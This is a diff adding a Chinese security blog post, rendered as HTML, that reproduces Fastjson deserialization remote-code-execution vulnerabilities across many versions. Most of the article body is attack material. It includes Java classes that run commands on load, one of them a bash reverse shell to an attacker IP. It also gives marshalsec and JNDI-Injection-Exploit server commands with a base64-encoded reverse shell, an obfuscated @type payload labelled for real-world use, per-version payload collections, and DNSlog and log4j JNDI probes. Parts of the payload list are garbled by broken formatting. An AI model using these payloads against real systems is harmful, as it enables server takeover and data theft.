@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="Dong Yuanxin">
+  
+  
+  <title>FastJson | hcncn6</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="漏洞复现,">
+  
+
+  
+  <meta name="description" content="hcncn小站">
+
+  
+
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":true},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2018-11-1",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Dong Yuanxin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">博客0v0</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 博客重建中，还有其他细节文章</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/hcncn6" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2022-09-05
+    </span>
+    
+      <span>
+        | <a href="/categories/漏洞复现/"><i class="fa fa-bookmark"></i>漏洞复现</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    FastJson
+  </h1>
+  
+  <article class="passage-article">
+    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line">简介</span><br><span class="line">	FastJson是阿里巴巴开源的Java对象和JSON格式字符串的快速转换的工具库，和google的Gson用法相似</span><br><span class="line">	首先，Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过。</span><br><span class="line">	1.3 漏洞概述</span><br><span class="line"></span><br><span class="line">漏洞是利用fastjson autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，服务器接收到危险类执行其中恶意代码。攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大的影响。</span><br><span class="line"></span><br><span class="line">	2. 命令执行回显</span><br><span class="line">常见的回显方式有三种：</span><br><span class="line">一种是直接将命令执行结果写入到静态资源文件里，如html、js等，然后通过http访问就可以直接看到结果。</span><br><span class="line">通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了。</span><br><span class="line">直接将命令执行结果回显到请求Poc的HTTP响应中。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Fastjson&lt;1.2.24远程代码执行</span><br><span class="line">	漏洞原理简介</span><br><span class="line"></span><br><span class="line">		： fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</span><br><span class="line">影响版本： fastjson &lt;=1.2.24</span><br><span class="line">	复现</span><br><span class="line">		touch&quot;, &quot;/tmp/success</span><br><span class="line"></span><br><span class="line">		创建TouchFile.java文件，内容如下：</span><br><span class="line"></span><br><span class="line">		// javac TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"> </span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/success&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">		然后javac TouchFile.java编译一下，生成TouchFile.class.</span><br><span class="line">		使用python 起一个http服务python -m SimpleHTTPServer 8888</span><br><span class="line">		web访问一下该http服务</span><br><span class="line"></span><br><span class="line">		java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.8.14:8888/#TouchFile&quot; 9999</span><br><span class="line">		修改请求方式为POST Content-Type改成application/json，并写入exp，然后发送请求。</span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line"> &quot;b&quot;:&#123;</span><br><span class="line"> &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line"> &quot;dataSourceName&quot;:&quot;rmi://192.168.8.14:9999/TouchFile&quot;,</span><br><span class="line"> &quot;autoCommit&quot;:true</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	反弹shell</span><br><span class="line">		import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line"> static &#123;</span><br><span class="line">     try &#123;</span><br><span class="line">         Runtime rt = Runtime.getRuntime();</span><br><span class="line">         String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.8.14/4444 0&gt;&amp;1&quot;&#125;;</span><br><span class="line">         Process pc = rt.exec(commands);</span><br><span class="line">         pc.waitFor();</span><br><span class="line">     &#125; catch (Exception e) &#123;</span><br><span class="line">     &#125;</span><br><span class="line">	 // do nothing</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		https://blog.csdn.net/guo15890025019/article/details/120532891</span><br><span class="line"></span><br><span class="line">Fastjson V1.2.47远程命令执行</span><br><span class="line">	简介</span><br><span class="line">		该漏洞利用方法和V1.2.24版本相似，仅攻击载荷不一样而已。</span><br><span class="line">fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</span><br><span class="line">	复现</span><br><span class="line">		&#123;</span><br><span class="line">  &quot;a&quot;:&#123;</span><br><span class="line"> &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line"> &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line"> &#125;,</span><br><span class="line"> &quot;b&quot;:&#123;</span><br><span class="line"> &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line"> &quot;dataSourceName&quot;:&quot;rmi://192.168.8.14:9999/TouchFile&quot;,</span><br><span class="line"> &quot;autoCommit&quot;:true</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">		2）下载fastjson_rce_tool</span><br><span class="line">地址：https://github.com/wyzxxz/fastjson_rce_tool下载jar</span><br><span class="line">		在cmd中执行java -cp fastjson_tool.jar fastjson.HLDAPServer 192.168.32.1 80 &quot;bash=/bin/bash -i &gt;&amp; /dev/tcp/192.168.32.1/888 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line">	&quot;a&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">		&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;b&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">		&quot;dataSourceName&quot;: &quot;ldap://192.168.32.1:80/Object&quot;,</span><br><span class="line">		&quot;autoCommit&quot;: true</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"> python -m http.server 9999</span><br><span class="line"></span><br><span class="line">		下一步建立rmi服务器，工具地址：https://github.com/welk1n/JNDI-Injection-Exploit</span><br><span class="line"></span><br><span class="line">		##起rmi服务器</span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;加密后的反弹shell命令&quot; -A &quot;起rmi服务器的vps ip&quot;</span><br><span class="line"></span><br><span class="line">##示例：</span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTQuMjA5LjYxLjE2Lzg1NTAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;154.209.16.16&quot;</span><br><span class="line"></span><br><span class="line">fastjson指纹识别</span><br><span class="line">	当我们在渗透测试中，抓包的时候发现返回的流量内容存在json格式时，我们就可以想它是不是使用了fastjson库</span><br><span class="line">	1.添加 &#123; 看报错</span><br><span class="line">	&#123;&quot;test&quot;:&quot;</span><br><span class="line"></span><br><span class="line">	2.利用dnslog盲打</span><br><span class="line">对目标发送一个POST请求，请求体内容如下。请求头添加Content-Type: application/json</span><br><span class="line">    &#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	//测试使用</span><br><span class="line">&#123;&quot;@type&quot;:&quot;javax.swing.JEditorPane&quot;,&quot;page&quot;: &quot;http://xr95bp.dxxxxg.cn&quot;&#125;</span><br><span class="line">&#123;&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://lotwy8.dnslog.cn&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br><span class="line">//log4j测试</span><br><span class="line">$&#123;jndi:rmi://localhost:1099/Text&#125;</span><br><span class="line">版本</span><br><span class="line">	1.2.62的RCE也很简单，由于CVE-2020-8840的gadget绕过了fastjson的黑名单而导致的，当服务端存在收到漏洞影响的xbean-reflect依赖并且开启fastjson的autotype时，远程攻击者可以通过精心构造的请求包触发漏洞从而导致在服务端上造成远程命令执行的效果。</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;ldap://x.x.x.x/Exp&quot;&#125;</span><br><span class="line">- fastjson 1.2.66 -</span><br><span class="line"></span><br><span class="line">和1.2.62类似，在开启AutoType的情况下，由于黑名单过滤不全而导致的绕过问题</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://x.x.x.x/Exp&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	探测</span><br><span class="line">		fastjson &gt;1.2.43</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;:&quot;x&quot;&#125;</span><br><span class="line"></span><br><span class="line">		fastjson &gt;1.2.48</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line"></span><br><span class="line">		fastjson &gt;1.2.68</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;:0</span><br><span class="line">		1.dnslog验证下漏洞环境是否可用</span><br><span class="line">&#123;&quot;x&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&#125;</span><br><span class="line">	fastjson出网</span><br><span class="line"></span><br><span class="line">	1.2.47版本以下的fastjson可以用如下payload</span><br><span class="line">	&#123;</span><br><span class="line"> &quot;a&quot;:&#123;</span><br><span class="line"> &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line"> &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line"> &#125;,</span><br><span class="line"> &quot;b&quot;:&#123;</span><br><span class="line"> &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line"> &quot;dataSourceName&quot;:&quot;ldap://vps:1389/test&quot;,</span><br><span class="line"> &quot;autoCommit&quot;:true</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">	实战1.2.47版本以下payload如下</span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line">		&quot;a&quot;: &#123;</span><br><span class="line">		&quot;@\u0074\x79\x70e&quot;: &quot;Lcom.s\u0075n.\u0072\u006Fwse\x74\x2E\u004A\u0064\u0062c\u0052owS\u0065t\u0049mpl;&quot;,</span><br><span class="line">		&quot;dataSourceName&quot;: &quot;ldap://vps:1389/test&quot;,</span><br><span class="line">		&quot;autoCommit&quot;: true</span><br><span class="line">		&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	# Fastjson 多版本payload集合</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">影响版本：</span><br><span class="line">### fastjson&lt;=1.2.24</span><br><span class="line">exp：</span><br><span class="line">```&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1099/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h3><p>前提：autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）<br>exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1098/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure></p>
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）<br>exp：<br><figure class="highlight plain"><figcaption><span>"autoCommit":true&#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">影响版本：</span><br><span class="line">### fastjson&lt;=1.2.43</span><br><span class="line">前提：autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</span><br><span class="line">exp：</span><br></pre></td></tr></table></figure></p>
+<p>{“@type”:”[com.sun.rowset.JdbcRowSetImpl”[{,”dataSourceName”:”ldap://localhost:1399/Exploit”, “autoCommit”:true}<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">影响版本：</span><br><span class="line">### fastjson&lt;=1.2.45</span><br><span class="line">前提：</span><br><span class="line">autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</span><br><span class="line">exp：</span><br><span class="line">```&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap://localhost:1399/Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;a&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.Class&quot;, </span><br><span class="line">    &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;, </span><br><span class="line">&quot;b&quot;: &#123;        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, </span><br><span class="line">    &quot;dataSourceName&quot;: &quot;ldap://x.x.x.x:1999/Exploit&quot;,         &quot;autoCommit&quot;: true</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h3><p>exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">影响版本：</span><br><span class="line">### fastjson&lt;=1.2.66</span><br><span class="line">前提：autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</span><br><span class="line">exp：</span><br></pre></td></tr></table></figure></p>
+<p>{“@type”:”org.apache.shiro.jndi.JndiObjectFactory”,”resourceName”:”ldap://192.168.80.1:1389/Calc”}<br>{“@type”:”br.com.anteros.dbcp.AnterosDBCPConfig”,”metricRegistry”:”ldap://192.168.80.1:1389/Calc”}<br>{“@type”:”org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup”,”jndiNames”:”ldap://192.168.80.1:1389/Calc”}<br>{“@type”:”com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig”,”properties”: {<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure></p>
+
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-41"><span class="toc-text">fastjson&lt;=1.2.41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-42"><span class="toc-text">fastjson&lt;=1.2.42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-47"><span class="toc-text">fastjson&lt;=1.2.47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-lt-1-2-62"><span class="toc-text">fastjson&lt;=1.2.62</span></a></li></ol>
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: hcncn</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://hcncn6.github.io/2022/09/05/复现/Fastjson/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2022/09/05/复现/Shiro/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2022/09/05/复现/Weblogic/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
